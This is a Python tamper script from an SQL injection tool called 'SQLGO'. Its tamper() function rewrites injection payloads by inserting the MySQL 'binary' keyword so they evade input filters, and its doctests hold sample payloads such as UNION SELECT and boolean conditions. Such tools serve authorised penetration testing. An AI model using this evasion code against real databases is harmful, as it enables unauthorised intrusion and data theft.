#!/usr/bin/env python
"""
# SQLGO License - Version 1.4

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

import re



def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Injects keyword binary where possible

    Requirement:
        * MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')
    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'
    >>> tamper('1 AND 2>1')
    '1 AND binary 2>binary 1'
    >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')
    'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"\bNULL\b", "binary NULL", retVal)
        retVal = re.sub(r"\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)", r"\g<1>binary \g<2>\g<3>binary \g<4>", retVal)
        retVal = re.sub(r"(\d+\s*[>=]\s*)(\d+)", r"binary \g<1>binary \g<2>", retVal)
        retVal = re.sub(r"\b((AND|OR)\s*)(\d+)", r"\g<1>binary \g<3>", retVal)
        retVal = re.sub(r"([>=]\s*)(\d+)", r"\g<1>binary \g<2>", retVal)
        retVal = re.sub(r"\b(0x[0-9a-f]+)", r"binary \g<1>", retVal)
        retVal = re.sub(r"(\s+binary)+", r"\g<1>", retVal)

    return retVal
